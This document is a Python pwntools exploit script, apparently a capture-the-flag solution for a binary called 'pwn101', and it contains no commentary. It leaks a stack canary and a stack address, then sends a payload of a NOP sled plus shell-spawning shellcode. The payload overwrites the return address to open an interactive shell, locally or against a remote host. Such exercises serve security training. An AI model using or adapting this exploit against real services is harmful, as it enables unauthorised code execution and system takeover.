#!/usr/bin/python3

from pwn import *
import sys

elf = context.binary = ELF('./pwn101')
# context.log_level = 'debug'

gdb_script ="""
b *main+234
b *main+292
continue
continue
"""

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gdb_script)
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2]) #ip / port
    else:
        return process(elf.path)
p = start()

p.recvuntil("you: ")
stackaddr = int(p.recvuntil("\n"),16)
info(f"Stack Address: {hex(stackaddr)}")

name = cyclic(105)
p.sendafter(b"name: ", name)
p.recvuntil(b"hello " + name)

canary = u64(b'\x00' + p.recvn(7))
info(f"Canary: {hex(canary)}")

sh = asm(shellcraft.sh())

payload =  b"\x90\x90" + sh
payload += b"\x90" * (216 - len(payload))
payload += p64(canary)
payload += b"B" * 8
payload += p64(stackaddr)

p.sendafter(b"message: ", payload)

p.interactive()
